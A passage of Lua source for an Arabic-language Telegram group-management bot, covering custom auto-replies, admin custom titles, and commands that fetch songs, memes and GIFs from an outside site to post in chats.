database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Manager'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end

if text == ("مسح ردود المطور") and Devmode(msg) then 
local list = database:smembers(bot_id.."List:Rd:Sudo")
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Sudo:Gif"..v)   
database:del(bot_id.."Add:Rd:Sudo:vico"..v)   
database:del(bot_id.."Add:Rd:Sudo:stekr"..v)     
database:del(bot_id.."Add:Rd:Sudo:Text"..v)   
database:del(bot_id.."Add:Rd:Sudo:Photo"..v)
database:del(bot_id.."Add:Rd:Sudo:Video"..v)
database:del(bot_id.."Add:Rd:Sudo:File"..v)
database:del(bot_id.."Add:Rd:Sudo:Audio"..v)
database:del(bot_id.."List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"⊀︰ تم مسح ردود المطور")
end
if text == ("ردود المطور") and Devmode(msg) then 
local list = database:smembers(bot_id.."List:Rd:Sudo")
text = "\n⊀︰ قائمة ردود المطور \n — — — — — — — — —\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Sudo:Gif"..v) then
db = "متحركه 🎭"
elseif database:get(bot_id.."Add:Rd:Sudo:vico"..v) then
db = "بصمه 📢"
elseif database:get(bot_id.."Add:Rd:Sudo:stekr"..v) then
db = "ملصق 🏷"
elseif database:get(bot_id.."Add:Rd:Sudo:Text"..v) then
db = "رساله ✉"
elseif database:get(bot_id.."Add:Rd:Sudo:Photo"..v) then
db = "صوره 👤"
elseif database:get(bot_id.."Add:Rd:Sudo:Video"..v) then
db = "فيديو 📹"
elseif database:get(bot_id.."Add:Rd:Sudo:File"..v) then
db = "ملف 📁"
elseif database:get(bot_id.."Add:Rd:Sudo:Audio"..v) then
db = "اغنيه 🎵"
end
text = text..""..k.." >> ("..v..") -› {"..db.."}\n"
end
if #list == 0 then
text = "⊀︰ لا يوجد ردود للمطور"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id.."Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:del(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Add:Rd:Sudo:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Add:Rd:Sudo:vico"..test, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Add:Rd:Sudo:Gif"..test, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."Add:Rd:Sudo:Text"..test, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:Sudo:Audio"..test, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:Sudo:File"..test, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:Sudo:Video"..test, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Add:Rd:Sudo:Photo"..test, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"⊀︰ تـم حفـظ الࢪد بنـجاح..🕸️")
return false  
end  
end

if text == "اضف رد عام" and Devmode(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,"*⊀︰ اࢪسل الكـلمـه التࢪيـد اضـافتهـا🕸️*")
database:set(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "حذف رد للكل" and Devmode(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,"*⊀︰ ارسل الكلمه التري تريد حذفها*")
database:set(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '⊀︰ الان ارسل الرد الذي تريد اضافته \n⊀︰ قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n⊀︰ يمكنك اضافه الى النص :\n⊀︰ 🌐 `#username` > معرف المستخدم\n⊀︰ 📨 `#msgs` > عدد رسائل المستخدم\n⊀︰ 📎 `#name` > اسم المستخدم\n⊀︰ 🆔 `#id` > ايدي المستخدم\n⊀︰ 🎖 `#stast` > رتبه المستخدم \n⊀︰ 📝 `#edit` > عدد السحكات ')
database:set(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"*⊀︰ تم ازالة الرد من قائمه ردود المطور*")
list = {"Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
database:del(bot_id..''..v..text)
end
database:del(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."List:Rd:Sudo", text)
return false
end
end

if text and not database:get(bot_id.."Reply:Sudo"..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:Sudo:Gif"..text)   
local veico = database:get(bot_id.."Add:Rd:Sudo:vico"..text)   
local stekr = database:get(bot_id.."Add:Rd:Sudo:stekr"..text)     
local Text = database:get(bot_id.."Add:Rd:Sudo:Text"..text)   
local photo = database:get(bot_id.."Add:Rd:Sudo:Photo"..text)
local video = database:get(bot_id.."Add:Rd:Sudo:Video"..text)
local document = database:get(bot_id.."Add:Rd:Sudo:File"..text)
local audio = database:get(bot_id.."Add:Rd:Sudo:Audio"..text)

if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local Msguser = database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local edit = database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit)
local Text = Text:gsub('#msgs',Msguser)
local Text = Text:gsub('#stast',rtp)
send(msg.chat_id_, msg.id_,'['..Text..']')
database:sadd(bot_id.."Spam:Texting"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, anemi, '', nil)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,'')
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:RiNdA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '*\n ⊀︰ ارسل الكلمه تريد اضافتها*')
database:set(bot_id.."botss:RiNdA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:RiNdA:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:RiNdA:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:RiNdA:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"*⊀︰ تم حذف الرد من ردود المتعدده*")
database:del(bot_id..'botss:RiNdA:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:RiNdA:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:RiNdA:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:RiNdA:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:RiNdA:List:Rd:Sudo", text)
return false
end
end
if text == ("مسح الردود المتعدده") and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local list = database:smembers(bot_id.."botss:RiNdA:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:RiNdA:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:RiNdA:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:RiNdA:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:RiNdA:List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"*⊀︰ تم حذف ردود المتعدده*")
end
------------------------------------------------------------------------
if Manager(msg) then
if text == ("مسح ردود المدير") and not database:get(bot_id.."Rio:Lock:GpRd"..msg.chat_id_) then
local list = database:smembers(bot_id.."List:Manager"..msg.chat_id_.."")
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..v..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..v..msg.chat_id_)
database:del(bot_id.."List:Manager"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"*⊀︰ تـم مسـح ࢪدود المـديࢪ*")
end
end
if text == ("ردود المدير") and Manager(msg) then
local list = database:smembers(bot_id.."List:Manager"..msg.chat_id_.."")
text = "⊀︰ قائمه ردود المدير \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_) then
db = "مـتحࢪكه"
elseif database:get(bot_id.."Add:Rd:Manager:Vico"..v..msg.chat_id_) then
db = "بـصمه"
elseif database:get(bot_id.."Add:Rd:Manager:Stekrs"..v..msg.chat_id_) then
db = "مـلصق"
elseif database:get(bot_id.."Add:Rd:Manager:Text"..v..msg.chat_id_) then
db = "ࢪسـاله"
elseif database:get(bot_id.."Add:Rd:Manager:Photo"..v..msg.chat_id_) then
db = "صوࢪه"
elseif database:get(bot_id.."Add:Rd:Manager:Video"..v..msg.chat_id_) then
db = "فـيديـو"
elseif database:get(bot_id.."Add:Rd:Manager:File"..v..msg.chat_id_) then
db = "مـلف"
elseif database:get(bot_id.."Add:Rd:Manager:Audio"..v..msg.chat_id_) then
db = "اغـنيه"
end
text = text..""..k..">> ("..v..") -› {"..db.."}\n"
end
if #list == 0 then
text = "*⊀︰ لا يوجد ردود للمدير*"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id.."Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_.."")
if database:get(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:del(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Add:Rd:Manager:Stekrs"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Add:Rd:Manager:Vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Add:Rd:Manager:Gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."Add:Rd:Manager:Text"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:Manager:Audio"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:Manager:File"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:Manager:Video"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Add:Rd:Manager:Photo"..test..msg.chat_id_, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"*⊀︰ تـم حفـظ الࢪد بنـجاح..🕸️*")
return false  
end  
end
if text == "اضف رد" and not database:get(bot_id.."Rio:Lock:AddRd"..msg.chat_id_) and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,"*⊀︰ ارسل الكلمه التي تريد اضافتها*")
database:set(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "حذف رد" and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,"*⊀︰ ارسل الكلمه التي تريد حذفها*")
database:set(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true2")
return false 
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '⊀︰ الان ارسل الرد الذي تريد اضافته \n⊀︰ قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n⊀︰ يمكنك اضافه الى النص :\n⊀︰ 🌐 `#username` > معرف المستخدم\n⊀︰ 📨 `#msgs` > عدد رسائل المستخدم\n⊀︰ 📎 `#name` > اسم المستخدم\n⊀︰ 🆔 `#id` > ايدي المستخدم\n⊀︰ 🎖 `#stast` > رتبه المستخدم \n⊀︰ 📝 `#edit` > عدد السحكات ')
database:set(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true1")
database:set(bot_id.."Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:sadd(bot_id.."List:Manager"..msg.chat_id_.."", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_.."") == "true2" then
send(msg.chat_id_, msg.id_,"*⊀︰ تم ازالة الرد من قائمه الردود*")
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:del(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."List:Manager"..msg.chat_id_.."", text)
return false
end
end
if text and not database:get(bot_id.."Reply:Manager"..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
local veico = database:get(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
local stekr = database:get(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
local Text = database:get(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
local photo = database:get(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
local video = database:get(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
local document = database:get(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
local audio = database:get(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local Msguser = database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local edit = database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit)
local Text = Text:gsub('#msgs',Msguser)
local Text = Text:gsub('#stast',rtp)
send(msg.chat_id_, msg.id_,'['..Text..']')
database:sadd(bot_id.."Spam:Texting"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, anemi, '', nil)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,'')
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end
------------------------------------------------------------------------
if text and text:match("^كول (.*)$") and not database:get(bot_id.."Speak:after:me"..msg.chat_id_) then
local Textxt = text:match("^كول (.*)$")
send(msg.chat_id_, msg.id_, '['..Textxt..']')
end

if text == "غنيلي" and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
data,res = https.request('https://ccccxcc.ml/David/Audios.php')
if res == 200 then
audios = json:decode(data)
if audios.Info == true then
local Text ='  يࢪوحـيِّ اختّاࢪيتلك الاغنيه اسمـ؏.🥤'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>',url="t.me/SourcE_RiNdA"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
if text == "ميمز" and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
data,res = https.request('https://ccccxcc.ml/David/memz.php')
if res == 200 then
audios = json:decode(data)
if audios.Info == true then
local Text ='*⊀︰ تـم اختياࢪ الميمز لـڪ⊀︰ 🍼*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>',url="t.me/SourcE_RiNdA"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
if text == "متحركه" and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
data,res = https.request('https://ccccxcc.ml/David/animation.php')
if res == 200 then
animation = json:decode(data)
if animation.Info == true then
local Text ='*⊀︰ تـم اختياࢪ المتحركه لـڪ⊀︰ 🍼*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>',url="t.me/SourcE_RiNdA"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation='..URL.escape(animation.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
if text == "راسلني" then
rpl = {"ها هلاو","انطق","كول"};
sender = rpl[math.random(#rpl)]
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' .. URL.escape(sender))
end
if text and text:match("^خلي لقب (.*)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local timsh = text:match("^خلي لقب (.*)$")
function start_function(extra, result, success)
local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
local getInfo = JSON.decode(chek)
if getInfo.result.can_promote_members == false then
send(msg.chat_id_, msg.id_,'⊀︰ لا يمكنني تعديل  او خلي لقب ليس لدي صلاحيه\n ⊀︰ قم بترقيتي جميع الصلاحيات او صلاحية اضافه مشرف ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n*⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..') '
status  = '\n⊀︰ الايدي > '..result.sender_user_id_..'\n⊀︰ ضـفتله {'..timsh..'} كلقب له'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&custom_title="..timsh)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text == ("حذف لقب") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس مشرف يرجى ترقيتي*') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ الايدي > `'..result.sender_user_id_..'`\n ⊀︰ تم حذف لقبه من الكروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^حذف لقب @(.*)$") and Constructor(msg) then
local username = text:match("^حذف لقب @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس مشرف يرجى ترقيتي*') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
